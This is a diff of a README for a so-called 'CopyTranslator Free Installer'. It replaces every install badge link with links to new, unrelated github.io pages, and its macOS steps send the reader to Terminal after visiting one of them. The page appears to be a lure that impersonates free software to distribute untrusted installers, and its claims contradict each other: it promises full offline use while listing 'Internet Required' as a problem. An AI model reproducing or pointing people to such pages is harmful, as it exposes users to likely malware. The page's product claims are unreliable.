@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Translation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 CopyTranslator Free Installer** — CopyTranslator is a free translation tool for Windows, macOS, and Linux that automatically translates text as you copy it to the clipboard. Works without internet access, no account required. Full offline installation.
+**💻 CopyTranslator Free Installer** — CopyTranslator is a free translation tool for Windows and macOS that automatically translates text copied to the clipboard. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install CopyTranslator](https://img.shields.io/badge/⬇_Install_CopyTranslator-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CopyTranslator](https://img.shields.io/badge/⬇_Install_CopyTranslator-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About CopyTranslator
 
-CopyTranslator is a free translation tool for Windows, macOS, and Linux that automatically translates text as you copy it to the clipboard. Reading foreign language papers, web pages, or documents becomes effortless — copy any text and CopyTranslator immediately shows the translation in a small, always-on-top window. Supports Google Translate, DeepL, and other translation services.
+CopyTranslator is a free translation tool for Windows and macOS that automatically translates text copied to the clipboard. It monitors clipboard activity and shows translations in a floating window — useful for reading foreign language documents.
 
 ---
 
 ## ❌ Problem: CopyTranslator is hard to access
 
-- **Internet Required** — Translation requires active internet connection
-- **Translation Quality** — Machine translation quality varies by language pair
-- **Privacy** — Text sent to external translation APIs
-- **Clipboard Interference** — Automatic clipboard monitoring can occasionally interfere with other workflows
+- **Privacy Concern** — Monitors clipboard constantly; all copied text potentially sent to translation API
+- **API Dependency** — Requires third-party translation API configuration
+- **Windows and macOS Only** — No Linux version available
+- **Internet Required** — No offline translation capability
 
 ---
 
@@ -61,9 +61,9 @@ CopyTranslator is a free translation tool for Windows, macOS, and Linux that aut
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ CopyTranslator is a free translation tool for Windows, macOS, and Linux that aut
 
 <div align="center">
 
-[![⬇ Install CopyTranslator](https://img.shields.io/badge/⬇_Install_CopyTranslator-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CopyTranslator](https://img.shields.io/badge/⬇_Install_CopyTranslator-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ CopyTranslator is a free translation tool for Windows, macOS, and Linux that aut
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ CopyTranslator is a free translation tool for Windows, macOS, and Linux that aut
 
 ---
 
-**CopyTranslator Free Installer** — CopyTranslator is a free translation tool for Windows, macOS, and Linux that automatically translates text as you copy it to the clipboard. Install without internet connection today!
+**CopyTranslator Free Installer** — CopyTranslator is a free translation tool for Windows and macOS that automatically translates text copied to the clipboard. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install CopyTranslator](https://img.shields.io/badge/⬇_Install_CopyTranslator-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CopyTranslator](https://img.shields.io/badge/⬇_Install_CopyTranslator-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
